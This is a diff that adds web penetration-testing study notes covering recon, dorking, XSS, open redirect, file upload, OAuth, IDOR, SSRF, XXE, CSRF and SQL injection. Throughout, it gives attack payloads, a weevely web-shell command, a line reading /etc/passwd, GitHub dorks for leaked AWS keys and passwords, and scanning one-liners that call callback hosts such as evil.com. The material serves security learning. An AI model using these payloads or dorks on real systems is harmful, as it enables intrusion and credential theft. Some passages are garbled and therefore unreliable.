@@ -1,0 +1,734 @@
+What is Information Gathering:
+
+Information gathering is the first step of any penetration test and involves gathering or collecting information about an individual. Company website or system you are targeting. It is the first step of Hacking and most of the time of Hacker spend his time in the process. Information gathering typically broken into 2 types Passitve Recon and Active Recon.
+
+Passitve Recon :
+* Identifyying IP Addresses and DNS Information
+* Identifying domain names and Its ownership information
+* Identifying Web Technologies being used on target site
+* Indentifing subdomains
+
+Active Recon:
+* Discovering Open Port on Target System
+* Learning about the internal Infrastructure of a target organization
+
+Whois:
+* Owner of Website
+* Email id used to register domain
+* Domain Register
+* Domain name server information
+
+Web Archive:
+* archive.org maintains logs of pages of website
+* also know as wayback Machine
+
+CMS:
+CMS stands for content management system. It is computer software or an application that manages all content when it is used for developing a website. Shopify, Wordpress, Drupal, Wix, and Magneto are the popular CMS.
+
+Subdomain:
+* A domain name is your website name 
+* A subdomain is a separate part of your website that operates under the same primary domain name
+* your create a subdomains to help orgranize and nevigate to different sections of your main websites
+
+Tools : sublist3r, subfinder, amass, finddomain
+
+https://subdomainfinder.c99.nl/
+https://www.nmmapper.com/sys/tools/subdomainfinder/
+https://seranking.com/free-tools/subdomain-finder.html
+https://osint.sh/subdomain/
+https://subdomains.whoisxmlapi.com/
+https://hackertarget.com/find-dns-host-records/
+
+*.google.com
+
+Types of Subdomain Enumeration:
+* Vertical Enumberation: It stands for the task or enumerating subdomains like : clouds.google.com
+* Horizontal Enumeration: It consists of findingother root domains belong to the target google.com, youtube.com adsense.com
+
+Google Dorking:
+site: filetype: intitle: inurl: intext:
+intitle:"Index of"
+
+DNS :
+
+* DNS stands for domain name system. DNS is a protocol that used to resolve domain names to ip address. Earlier user would have to remember IP address of they site they wanted to visit. DNS server is like a directory that contins domain names and its corresponding IP address.
+
+DNS Records:
+
+A - Resolves a domain to an IPV4 address
+AAAA - Resolves a domain to an IPV6 address
+MX - Resolves a domain to a mail server
+TXT - text records
+CNAME - used for domain Alias
+
+ClickJacking:
+
+It is also known UI Redressing. It is a common hacking technique in which an attacker creates an invisible page or an html element that overlays the legitimate page
+
+Impact:
+The user assumes that they are entering their information into a usual from but they are actually entering it in fields the hacker has overlaid on the UI. Hackers will target passwords credit card numbers and any other valuable data they can exploit
+
+Test Onlibe : https://cybertix.in/clickjacking/
+
+Prevent:
+X-Frame-Options: Probably the best solution at present is to use the X-Frame-Options(XFO) Http Response header in server response
+Content Security Policy : The Content Security Policy(CSP) was initially developed to portect against XSS and other data injection attacks
+
+
+Conetnt Spoofing:
+
+It allows end user of the vulnerable web application to modify the actual content on the web page. When an application does not properly handle user supplied data, an attacker can supply content to a web application typically via a parameter vallue that is reflected to the user.
+
+Text Injection: In this, the user will be able to inject only plain text into the page. A valid web page now shows the false information according to the parameter. This attack is genarally used as, or in conjunction with social engineering.
+
+Html Injection:
+
+it is a similar to text injection and as names suggests it allows HTML content to be the injected. this could be even more serious when the main message from parameters is directly rendered without any encoding or filtering
+
+Payloads: https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Html-Injection-Payloads.txt
+
+
+What is Cross Site scripting(XSS)
+
+It is a client-side code injection attack. Cross-site scripting is a type of security vulnerability that can be exploited by hackers to inject malicious code into the web pages viewed by other users. A payload is a component of the attack that causes harm to the victim.
+ 
+What types of attacks can Happen From XSS:
+
+Stealing the login session token, allowing the attackre to interact with the application as the victim without knowing his password.Changing the content of page.Imagine a vulnerable bank web application forcing you to transfer money
+
+Type of XSS: Reflected XSS, Self XSS, Stored XSS, Dom XSS
+
+Refleected XSS:
+In this type of XSS the malicious script in reflected from the server back to the client. If an attacker wants to use reflected XSS they have to send the paylaod to each victim. In this the attackers craft malicious links phishing emails or use various other techniques to trick victims into sending malicious requests to the server.
+
+
+Stored base XSS:
+In this our Payload will be send to the server and get stored in our database.Whenever victims navigate to that page our malicious code will be executed.After it stored the application delivers the payload to all users accessing that part of the application
+
+Dom XSS:
+It is hierarchical representation of the elements on the page.it is an inegral part of how modern websites work. DOM methods allow programmatic access to the tree.With them you can change the documents structure style or content.
+
+Why Dom is Required: HTML is used to structure the web pages and JS is used to add behavior to our web pages. When an HTML file is loaded into the browser,the JS can not understannd the HTML document directly.Dom is basically the representation of the same HTML document but in a different format with the use of objects.
+
+DOM XSS:
+When an application uses a Dom to store data, the data remains only on the client side when the browser reads and displays the output. Don't miss access vulnerabilities usually arise when the JavaScript takes data from the attacker and contacts controllable sources that enable it to execute malicious JavaScript, which typically allows them to hijack other users accounts to deliver it. On this access attack, you need to place data into the secure so that it is propagated. You think and call this execution of arbitrary JavaScript.
+
+Source: 
+It is JS property that contains dataa that an attacker could potentially control.The source is the property that reds from thr DOM. Source is the input where the paylaod in injected.
+Example:
+* document.URL, document.cookie,document.location.href
+
+Sink:
+It is DOM object that allows JS code execution or rendaring the HTML. It is the place wher untruted input gets outputted on the page or executed by js with in the page.
+
+Example:
+HTML Element : document.write, inner.HTML
+Execution Sink : eval() setTimeout()
+
+Injection Point:Contact Forms, Registration page ETC. User Agent, Referrer
+
+BLind XSS:
+It is a type of Stored XSS in which the attacker,s input is saved by the server and is reflected in the developers application. Attackers in BXSS inject inject their payload "blindly" on web pages that are likely to save their payload into the database. Attacker waits for a server-side user or team member [who deals with website datebases] to open or trigger that script or payload to execute.
+
+Payload : https://bxsshunter.com/bxss-hunter
+
+Automation:
+echo http://testphp.vulnweb.com | katana -jc -f qurl -d 5 -c 50 -kf robotstxt,sitemapxml -silent | dalfox pipe --skip-bav
+waybackurls http://testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee XSS.txt && cat XSS.txt | dalfox -b http://chirag.bxss.in pipe > output.txt
+
+Tool : https://github.com/theinfosecguy/QuickXSS
+./QuickXSS.sh -d <target.com>
+./QuickXSS.sh -d <target.com> -b <blindxss.xss.ht>
+./QuickXSS.sh -d <target.com> -o xss_results.txt 
+./QuickXSS.sh -d <target.com> -b <blindxss.xss.ht> -o xss_results.txt
+
+
+URL Redirection:
+
+URL Redirection is a vulnerability which allows an attacker to force users of your application to and untrusted external site. The attack is most offen performed by delivering a link to the victom, who then clicks the link and is unknowingly redirected to the malicious website. it is also called open redirect.
+
+
+Types of URL redirect:
+* parameter based URL Redirection
+* Session Restriction URL Redirection
+* Dom based URL Redirection
+
+Parameter based URL Redirection:
+* This type of Redirection is very common and easy to spot.
+1. A get parameter containing URL 
+2. A 302/301 redirect made using that parameter
+3. Eg: https://example.com/forum/out.php?link=https://evil.com
+
+Session Restriction URL Redirection:
+* The website instrucs the server to store/dashboard to redirect the user after authentication.
+Eg : https://example.com/login?returnUrl=/dashboard
+
+* This scenario can be tricky since the application does not immediately reflrct the URL in a 302 redirect but is stored but waiting for a successful authorization.
+Eg : https://example.com/login?returnUrl=http://evil.com
+
+
+Dom based URL Redirection:
+* A url is your web browser such as https://example.com/#dashboard does not send #dashboard to the application.
+* Because JavaScript can obtain data directly from the browser.
+* This would be open redirection. An attacker could create a link https://example.com/#http://evil.com and phish the users! By using Dom attributes.
+
+
+inurl:url=https
+inurl:url=http
+inurl:u=https
+inurl:u=http
+inurl:redirect?https
+inurl:redirect?http
+inurl:redirect=https
+inurl:redirect=http
+inurl:link=http
+inurl:link=https
+
+/\/google.com
+\/google.com
+\/\/google.com
+\\google.com
+//google.com
+https://google.com%3F.target.com/
+https://google?c=.target.com/
+//%2F/google.com
+////google.com
+https://target.com.google.com
+/%0D/google.com (%09,%00, %0a, %07)
+/%2F/google.com
+/%5Cgoogle.com
+//google%E3%80%82com
+
+
+OneLiner:
+waybackurls TARGET.COM | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
+subfinder -dL domains.txt | httprobe |tee live_domain.txt; cat live_domain.txt | waybackurls | tee wayback.txt; cat wayback.txt | sort -u | grep "\?" > open.txt; nuclei -t Url-Redirection-Catcher.yaml -l open.txt
+
+
+
+Github Recon:
+
+Github is a Git Repository hosting services. This reositories can contain API keys, Password, Customer data etc. It can contain lots of sensitive Information which can be useful for an attacker.
+
+Recon are 2 types:
+
+Manual Github Recon
+Automatic Github Recon
+
+Manual Github Recon:
+
+Github Dorks:
+"filename:bashrc password"
+"extention:sql mysql dump"
+"extention:sql mysql dump password"
+"filename:wp-config.php"
+"filename:config.json auths"
+
+Password Dorks:
+“target.com” pwd
+“target.com” passwd
+“target.com” password
+“target.com” dbpassword
+“target.com” access_key
+“target.com” secret_access_key
+“target.com” bucket_password
+“target.com” redis_password
+“target.com” root_password
+
+AWS Credential Dorks:
+org:Target  “bucket_name”
+org:Target  “aws_access_key”
+org:Target  “aws_secret_key”
+org:Target  “S3_BUCKET”
+org:Target  “S3_ACCESS_KEY_ID”
+org:Target  “S3_SECRET_ACCESS_KEY”
+org:Target  “S3_ENDPOINT”
+org:Target  “AWS_ACCESS_KEY_ID”
+org:Target  “list_aws_account”
+
+Sensitive files:
+filename:manifest.xml
+filename:travis.yml
+filename:vim_settings.xml
+filename:database
+filename:prod.secret.exs
+filename:npmrc_auth
+filename:dockercfg auth
+filename:Web Server.xml
+filename:.basgrc password
+filename:.get-credentials
+filename:config.php dbpasswd
+filename:dhcpd.conf
+filename:.htpasswd
+filename:wp-config.php
+filename:ssh/id_rsa
+filename:sftp.json
+
+Server Dorks:
+“target.com” FTP
+“target.com” SMTP
+“target.com” LDAP
+“target.com” SSH
+
+
+Automatic Search:
+
+GitDorker:   https://github.com/obheda12/GitDorker
+gitGraber:   https://github.com/hisxo/gitGraber
+trufflehog:  https://github.com/trufflesecurity/truffleHog
+
+How to use gitdorker:
+Settings > Developer Settings > Personal Access Token > Fine gain Token > genarate new token[genarate 10/15 tokens] > go to gitdorker/tf and paste the tokens 
+
+python3 GitDorker.py -tf /root/GitDorker/tf/TOKENSFILE -org teslamotors -d /root/GitDorker/Dorks/medium_dorks.txt -o x.txt
+
+How to use gitgraber:
+
+genarate the tokens and paste the config file like : ['token','token','token','token']
+python3 gitGraber.py -k wordlists/keywords.txt -q "dell.com"
+
+
+WHAT is SOP?
+
+Sop (Same origin policy) restricts scripts on one origin from accessing data from another origin. When a browser sends an HTTP request from one origin to another, any cookies, including authentication session cookies, related to the other domain are also sent as part of the request. Many websites interact with subdomains or third-party sites in a way that requires full cross-origin access.
+
+What is CORS?
+
+It allows you to make requests from one website to another website in the browser. it normally prohibited by another browser policy called same origin policy. CORS allows servers to specify certain trusted "origins" they are willing be permit requests from
+
+
+
+Request Site:
+
+* Origin : The origin header that wuolf be invluded with the actual request being made by the website
+* Access-Control-request-method : the method of the actual requestbeing made by the website.
+* Access-control-request-headers : A comma- separated list of headers that would be included in the request
+
+Response Site:
+* Access Control ALlow Origin : The whitelisted origin or '*'
+* Access contol allow methods : A comma separated list of http methods the web server wishes to permit for cross origin request
+* Access control allow headers : A comman separated list of hhttp headers the web server wishes to permit for cross origin requests
+
+File Upload Funcitonality:
+
+The file upload function allows users to upload a file to the web server's file system. This function may have certain rules (for example, only jpg files are allowed to be uploaded). So what happens if we manage to upload a PHP file to the web server with a file upload function that only accepts JPG?
+
+FIle Upload Vulnerability: The file upload vulnerability is a type of vulnerability where an attacker uploads a file with malicious code in it that can be executed on the server. The attacker is likely to put a phishing page on the site.
+
+Dangerous FIle Upload Vulnerability: 
+* Create a web shell
+* Replace System files
+* Dos Attack
+* Stored XSS vulnerability
+* Directory Traersal
+* RCE
+
+File Upload Vulnerability throughh "Weevely":
+
+For file vulnerability exploitation, we need to create a backdoor, so we will use weevely tool. Weevely is a stealth PHP web shell tht mimics a telnet-line connection. it is a tool web-application post exploitation and can be utilize a backdoor.
+
+cmd : weevely genarate <password> <name of webshell>
+      weevely genarate 1234 x.php
+
+
+XSS through File UPlaod:
+
+In kali Linux rename any image with XSS payload
+* Example
+* "><img src=x onerror=alert(document.domain)>.jpeg
+* "><img src=x onerror=alert(document.domain)>.gif
+* "><img src=x onerror=alert(document.domain)>.png
+* "><img src=x onerror=alert(document.domain)>.mp4
+
+* Try at any uplaod endpoint.
+
+<?php echo file_get_contents(/ctc/passwd); ?>
+
+Lab : https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
+
+
+Web Cache Poisoning:
+
+Cache: Caches save copies of responses to reduce load on the backend system. When a cache receives an HTTP request, it looks into the web cache server. If the request is already stored in the cache memory, it will provide you with a response directly without passing the request to the server.
+
+Web Cache Poisoning : It is a technique by which an attacker tricks a web server into storing harmful or incorrect information in its cache memory. In web cache poisoning, the attacker tries to make the server store bad data, so when someone visits the website, they are served that bad data.
+
+
+Possible Attacks:
+
+* Content Spoofing: An attacker can manipulate the cached content to display incorrect or malicious information to website visitors.
+* Session hijacking: By poisoning the cache, an attacker can gain unaythorized access to user sessions. They can tamper with session tokens or cookies stored in the cache, allowing them to impersonate legitimate users and perform malicious actions on their behalf.
+* XSS: Web cache poising can be used to inject malicious scripts into the cache, which are then served to multiple users visiting the website.
+
+
+Possible Attacks:
+
+* Content Spoofing: An attacker can manipulate the cached content to display incorrect or malicious information to website visitors.
+* Session hijacking: By poisoning the cache, an attacker can gain unaythorized access to user sessions. They can tamper with session tokens or cookies stored in the cache, allowing them to impersonate legitimate users and perform malicious actions on their behalf.
+* XSS: Web cache poising can be used to inject malicious scripts into the cache, which are then served to multiple users visiting the website.
+
+
+Web Socket Vulnerability:
+
+WebSockets are a communication protocol that provides full-dublex, real-time communication between a client(typically a web browser) and a serer. WebSockets are a bi-directional full duplex communications protocol initiated over http.They are commonly used in modern web applications for streaming data and other asynchronous.
+
+
+Working of HTTP:
+Most communication between web browsers and web sites uses HTTP. with HTTP the client sends a requests and the server returns a response.
+
+Working Of Websocket:
+websocket connections are initiated over HTTP and are typically long-lived. Messages can be sent in either direction at any time and are not transactional in nature.The Connection will normally stay open and idle untill either the client or the server is ready to send a message.
+
+Browser site: XSS, CSRF
+Server : SSRF, XXE, SQLI
+
+Analyze WebSocket:
+* Manipulating websocket traffic can be done in 3 ways:
+
+01. Intercepting and modifying websocket message.
+02. Replaying and genarating new websocket message.
+03. Manipulating websocket message.
+
+
+proxy > web Socket History
+
+OAuth Misconfiguration:
+
+Oauth is an standard authorization protocol that provides applications the abilityfor "secure designated access".Oauth doesnot share passworddata but instead uses authorization tokens to prove an identify between consumers and service providers.Eg: We can tell Facebook thats its ok for target.com to access your profile or post updates to your timeline without having to give target your facebook password
+
+How Oauth Works:
+
+* It is a way of sharing access to specific data between applications.
+* It works by defining a series of interaction between 3 parties:
+Client application: The website that wanrs to accesss the users data.
+Resoure Owner : The website that controls that users data and access to it
+Oauth Service Provide: They support OAuth by providing API for interacting with both authorization server and a resource server
+
+
+What is Oauth Grant Type:
+
+It determines the exact sequence of steps that are involved in the Oauth Process. In this, the user is asked whether they consent to the requested access. If they accept, the client application is granted an "authorization code." The client application then exchanges the code with the Oauth service to receive an "access token, which they can use to make API calls to fetch the relevant data. At this time, a client secret is also generated, which the client application must use to authenticate itself when sending these server-to-server requests.
+
+
+* Autheorization REquest/ authorization
+
+GET /authorization?client_id=12345&redirect_url=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
+
+* User Login and Consent
+* Authorization Code grant: /callbank
+	* Get /callback?code=ae13d489bd&statte=ae13d489bd HTTP/1.1
+* Access Token Request: /token
+	* POST /token
+* Accress token Grant
+* API Call: /userinfo
+	* GET /userinfo HTTP/1.1
+	  Authorization: bearer z0y9x8w7v6u5
+
+Steps to Perform:
+
+* Goto target.com Register yourself with normal email flow
+* see if there is Oauth functionality or not[EG. Google Facebook]
+* If it is there intercept it with BURP now click on Google icon for linking
+* Observe the request and look for state= parameter is implemented or not
+* if state= parameter is not there whichmeans ir is Vulnerable to CSRF
+
+1. once you successfully authenticated then intercept the "callback" request from google
+2. Genarate CSRF poC on the page and save it in .html file
+3. Now, Create another account go to that page where we are linking social media account
+4. now open that .html file beside that tab and click submit request
+5. You google account is successfully linked victimed account
+6. Logout and try to login with social media
+
+
+Broken Access Control: 
+
+What is access control:
+
+* Access control is a security technique that regulates who or what can view or use resources in a computing enviroment.
+* in the context of web application,access control is dependent on authentication and session maangement:
+	* Authentication identifies the user and confirms that are who they say they are.
+	* Session management identifies which subsequent HTTP requests are being made by that same user
+	* Access control determmines whether the user is allowed to carry out the action that they are attempting to perform.
+
+* Broken access control is a type of vulnerability that allows unauthorized user to gain access to sensitive data or system.
+* Broken access controls are a commonly encountered and critical security vulnerability.
+
+Example of BAC:
+* Insecure ID's(IDOR)
+* Directory Travesal
+* Unauthenticated Endpoint
+
+Vertical Privilege Escalation:
+
+* Vertical access controls are mechanisms that restrict access to sensitive functionality that is not available to other types of users.
+* Vertical privilege escalation occurs when an attacker gains access directly to an account with the intent to perform actions as that person.
+* The goal here is to access an account to further spread an attack or access data the user has permission to.
+
+Horizontal Privilege Escalation:
+
+* Horizontal access controls are mechanisms hat restrict access to resources to the users who are speciafically allowed to access those resources
+* For example, a banking application will allow a user to view transaction and make payments from their own accounts, but not the accounts of any other user.
+* Horizontal privilege escalation is a bit tricky to pull of as it requires the attacker to gain access to the account credentials as well as elevating the permission
+
+IDOR:
+
+Idor refers to an access control vulnerability where you can access resources you wouldnot ordinarily be able to see. This occurs when the programmer exposes a direct object Reference, Which is just an identifer that refers to specific object with the server.
+
+Example: Lets say we are logging into our bank account and after correctly authenticating ourselves,we got taken to a url like this https://bank.com.account?id=11111
+
+
+How to find IDOR:
+
+* Capture all the traffic in a proxy.
+* Find all request (GET or POST) which has any object identifier like id,pid,uid etc 
+* Create another account and get the identifier from both accounts
+* Use one of the accounts Session/Auth header and replay each request with the object identifier from another account.
+SSTI Server Side Template Injection::
+
+What are Template:
+
+Web developers use template engines populate dynamic data into modern web pages.Enable them into separate busiiness logic with presentation logic.Template Engines are commonly used to : Displays information about users, products, companies. Displays photos and videos.Sell products online.Sends bulk emails
+
+
+What is Server Side Template Injecction:
+
+When the user inputs is embedded in template files in an unsafe manner, Such an attack can be confused with XSS attacks. XSS attacks are well known and often straightforward to exploit, but the SSTI vulnerability can be missed.
+
+Impact of SSTI: RCE, Path Traversal, LFI
+
+Mitigation of SSTI:
+* Framework and library updates
+* Input Sanitization
+* Sandboxing
+
+
+Command Injection::
+
+OS command Injection is also known as shell injection. It allows an attacker to execute arbitary operating system(OS) commands on the server that is running an application. The vulnerability can fully compromise the application and all its data
+
+useful commands :
+
+Linux : whoami, uname -a, ifconfig, netstat -an, ps -ef
+Windows : whoami, ver, ifconfig/all,netstat -an, tasklist
+
+
+Blind COmmand Inection:
+* In Blind Commnd Injextion, The appliction doesnot return the output from the commonand within its HTTP response
+
+Detection Method:
+* You can use an injextion commannd that will trigger a time delay.
+* The ping command is an effective way to do this
+	* & ping -c 10 127.0.0.1 &
+
+Ways of injection OS Commands: &, &&, |, || [you can try can try to injetion commad by this]
+Separators works only on Unix-Based System: ;, newline(0x0a or \n). ', $(
+
+
+SSRF:
+
+SSRF stands for server-side request forgery. It allows an attaacker to induce the server-side application to make requests to an uninternded location. The attaaacker might be cause the server to make a connection tointernal services within the organizations ifrastructure
+
+Types of SSRF:
+* BLind SSRF, Limited Response/partial SSRF, Full Response SSRF
+
+What can we do with SSRF?
+* SSRF to Reflected XSS: http://www.target.com?url=http://brutelogic.om.br/poc.svg
+* Scan internal networks and ports
+* Fetch File system
+
+SSRF to RCE:
+* append : ?'whoami' after burpcollaborator link: <burpcollaborator link>?'whoami'
+
+XXE:
+
+What is XML:
+
+XML stands for extensible Markup Language. It is a maarkup language much like HTML. It was designed to store and transport data.XML uses for data store and transport.You can use own tag
+
+Example:
+<note>
+	<to>Chirag</to>
+	<from>Cybertix</from>
+	<heading>Notice</heading>
+	<body>Please Help me</body>
+</note>
+
+
+DTD:
+DTD stands for Document Type Defination. A DTD defines the structure and the legal element and attribute of an XML document.
+
+Example:
+<!DOCTYPE note
+[
+<!ELEMENT note (to,from,heading,body)>
+<!ELEMENT to (#PCDATA)>
+<!ELEMENT from (#PCDATA)>
+<!ELEMENT heading (#PCDATA)>
+<!ELEMENT body (#PCDATA)>
+]>
+
+What are XML external entites:
+XML external entities are a type of custom entity ehose definition is located outside of the DTD where they are declared. The declaration of an external entity uses the SYSTEM keyword and must specify a URL from which the value of the entity should be loaded.
+
+EXample:
+<!DOCTYPE foo [ <!ENTITY ext SYSTEM "https://cybertix.in">]>
+
+Type of XXE Attack:
+* Exploting XXE to retrieve files
+* Exploting XXE to Perform SSRF attacks
+* Exploting blind XXE exflitrate data out-of-band
+* EXploting blind XXE to retrieve data via error messages
+
+Different TestCase To EXploit XXE:
+* XXE via Image file upload
+* XXE via XSV upload
+* XXE via Out-of-and Interaction
+
+
+CSRF:
+
+CSRF stands for Cross-site request Forgery.It is also called as XSRF.It is a type of attack which attacker tricks victim to do the malicious task on behalf of attacker interest. CSRF will only work if the victim is Authenticated.Through CSRF attacker can bypass the Authentication.
+
+Note: CSRF vulnerability works when 2 accounts are login in a same time
+
+How to execute CSRF:
+* To trick the victim info clicking a link or loading up a page
+* We have to send a "FORGET" or made-up request to the victims browser
+* The request will be sent with the values that the attacker wants
+* The web-application will consider this request as ORiginal but in reality the victim is sending the request on the attacker,s command
+
+How to prevent it:
+Anti-CSRF token: It uses a token that associated with a particular user and can be found as hidden value
+Same Site Cookies : Same site COokie is a cookie which can only be sent,If the requesst is being made from the same origin
+
+
+Tools :
+
+Engagement tools > Genarate CSRF POC > Option > auto submit > regenarate > then copy and paste the target place
+
+Online : https://security.love/CSRF-PoC-Genorator/
+
+SQLI:
+
+SQL stands for structured Query Language. SQL can ececute queries against database. it can retrieve data from database. it can insert records in a database. it can update recoords in a database. it can delete records from a database . it can create new database
+
+SELECT - EXtracts data from a database
+UPDATE - updates data in a database
+DELETE - delete data from a database
+INSET INTO - insert new data into a databse
+CREATE DATABASE - create a new database
+DROP TABLE - delte a table
+
+To run a database in linux: service mysql start >>>> mysql -u root
+
+SQLI:It is a vulnerability that allows the execution of malicious SQL statements. These statements control the database server behind a web application. SQLI is one of the most dangerous web application vulnerabilities.
+
+injection point Catagory of SQLI:
+* SQLI can be GET based
+* SQLI can be POST based
+* SQLI can be Header Based
+* SQLI can be cookie based
+
+
+GET based SQLI:
+* The attacer have to attaack through URL parameter. EG: target.com/filename.programming?parameter=value
+POST based SQL Injextion:
+* Attacker have to findany html from that may execute SQL query Eg: signup Form, Login FOrm
+Header Based SQLI:
+* You have to attack through Header Parameter. Eg: Referrer, User-agent, Location,Host
+Cookie based SQLI:
+* You have to find cookies parameter Eg: Cooie: username=xyz
+
+Payload:
+' OR 1=1--
+'+OR+1=1--
+%27%2BOR%2B1%3D1%2D%2D
+
+
+Authentication/Auth Bypass:
+
+Authentication is the process of verifying a user or device before allowing access to a system or resource. It is the act of checking user credentials to identify whether the user is authenticated and can have access to sensitive information that comes under that specific user role, like a normal user, an admin user, etc.
+
+It is a security vulnerability that occurs when an attacker can manipulate a SQL query in a way that allows them to bypass authentication and gain unauthorized access to a system or application. This type of attack can have serious consequences, as it can enable attackers to access sensitive data, perform actions on behalf of other users, or compromise the security of an entire system.
+
+SQLI UNION Attack:
+
+The UNION operator is used to combine the result set of two or more SELECT statement. Every SELECT statement within UNION mst have the same number of columns. The columns must also have smililar data types. The columns in every SELECT statemtnt must also be in the same order
+
+Attack::
+
+We can use he union keyword to retrieve data from other tables within the database. This is commonly known as SQL injection UNION attack. The UNION keyword enables you to execute one or more additional SELECT queries and append the results to the orginal query. EG: SELECT a,b FROM table1 UNION SELECT c,d FROM table2
+
+Requirement:
+How many columns are being returned from the original query. Which columns returned from the original query are of a suitable data type to hold the results from the injected query.
+
+Determining number of Columns:
+
+There are 2 ways to determine number of Column:
+* By using ORDER BY clause
+* Null Operator
+The ORDER BY clauses are used frim uncrementing the specified column index untill an error occurs:
+
+Eg:
+* 'ORDER BY 1--
+* 'ORDER BY 2--
+* 'ORDER BY 3--
+
+Error: The ORDER BY position number 3 is out of range of the number of items in the select.
+
+By using Null Operator:
+
+
+NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when coulmn count is correct:
+EG:
+* 'UNION SELECT NULL--
+* 'UNION SELECT NULL,NULL--
+* 'UNION SELECT NULL,NULL,NULL--
+Error: All queries combined using a UNION, INTERSECT or EXCEPT operator must have to equal number oof expressions in their target lists
+
+
+Blind SQL Injection:
+
+In Blind SQLI, the HTTP response do not contain the results of the relevant SQL query or the details of any database error. Many Techniques such as UNION attacks are not effective with blind SQLI vulnerabilities. We can also call it as inferential SQLI. It is still possible to exploit blind SQLI to aaccess unauthorized data but different techniques must be used. There are 2 types Time based and Boolean Based.
+
+It is known as content-based Blind SQLI. In this the attacker makes different SQL queries that ask the database TRUE or False questions. Then they analyze difference in responses between TRUUE and False statements.
+
+Eg:
+param = xyz' AND '1'='1 > TRUE
+
+Time based BLind SQL Injection:
+In this, an attacker sends specific SQL queries that force the database to "sleep" or pause for a specified period, thus confirming the vulnerability. It is used when the application is configured to suppress error messages but has not sufficiently mitigated the underlying SQLI vulnerability. The response time will indicate to the attacker whether the result of the query is  TRUE or FALSE.
+
+Payloads:
+sleep(5)#
+1 or sleep(5)#
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+1 or pg_sleep(5)--
+" or pg_sleep(5)--
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)--
+
+Oneliner:
+* echo http://testphp.vulnweb.com | waybackurls > wayback_urls_for_target.txt ; python3 sqlidetector.py -f  wayback_urls_for_target.txt
+* subfinder -d http://TARGET.com -silent -all | gau - blacklist ttf,woff,svg,png | sort -u | gf sqli >gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli.txt
+* findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1
+* cat urls.txt | grep ".php" | sed 's/\.php.*/.php\//' | sort -u | sed s/$/%27%22%60/ | while read url do ; do curl --silent "$url" | grep -qs "You have an error in your SQL syntax" && echo -e "$url \e[1;32mSQLI by Cybertix\e[0m" || echo -e "$url \e[1;31mNot Vulnerable to SQLI Injection\e[0m" ;done
+* cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
+* cat urls.txt | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)" > blindsqli.txt
+
+QuickXSS : https://github.com/theinfosecguy/QuickXSS
+SQLiDetector : https://github.com/eslam3kl/SQLiDetector
+
+
+
+
+
+
+
+
+
+
+
+ 
+
